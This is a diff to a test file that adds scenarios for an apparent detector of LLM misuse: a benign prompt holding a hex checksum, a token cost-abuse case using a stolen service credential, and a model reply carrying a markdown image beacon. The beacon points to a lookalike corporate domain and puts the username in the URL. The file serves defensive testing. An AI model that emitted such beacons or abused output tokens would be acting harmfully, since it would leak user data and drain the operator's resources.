@@ -96,6 +96,11 @@ def benign_scenarios() -> list[Scenario]:
               gap=timedelta(minutes=4)) for _ in range(4)],
         description="Power user pasting long text a few times; must stay under the consumption threshold."))
     out.append(Scenario(
+        "benign-pasted-hash", "benign", "bence.nagy", "10.20.1.12",
+        [Turn("The installer checksum on the share is "
+              "9f86d081884c7d659a2feaa0c55ad015a3bf4f1b2b0b822cd15d6c15b0f00a08, which VPN client version is that?")],
+        description="Long hex digest in a prompt; must not be mistaken for base64 (LLMD-011)."))
+    out.append(Scenario(
         "benign-vendor-question", "benign", "gabor.kiss", "10.20.1.17",
         [Turn("When is the CargoLink pickup cutoff for same day collection?",
               [_say("Pickup requests placed before 14:00 are collected the same working day.")])],
@@ -181,6 +186,18 @@ def attack_scenarios() -> list[Scenario]:
             gap=timedelta(seconds=45)) for _ in range(12)],
             expect=["LLMD-009"], stateless=True,
             description="Stolen service credential used to burn tokens on unrelated work."),
+        Scenario("atk-output-harvesting", "attack", "api.svc-batch", "203.0.113.90", [Turn(
+            "Write a 5000 word marketing story about parcels.",
+            [ModelResponse(content="[story omitted]", output_tokens=7500)],
+            gap=timedelta(seconds=60)) for _ in range(8)],
+            expect=["LLMD-009"], stateless=True,
+            description="Short prompts asking for very long outputs: the cost is on the output side."),
+        Scenario("atk-lookalike-domain-beacon", "attack", "ferenc.varga", "10.20.1.16", [Turn(
+            "Show me the delivery status badge",
+            [_say("Status: on time ![badge](https://acme-freight.hu.cargolink-cdn.net/b.png?u=ferenc.varga&q=badge)")])],
+            expect=["LLMD-005"],
+            description="Image beacon on a host that starts with the corporate domain; substring "
+                        "allowlists would wave it through."),
     ]
 
 
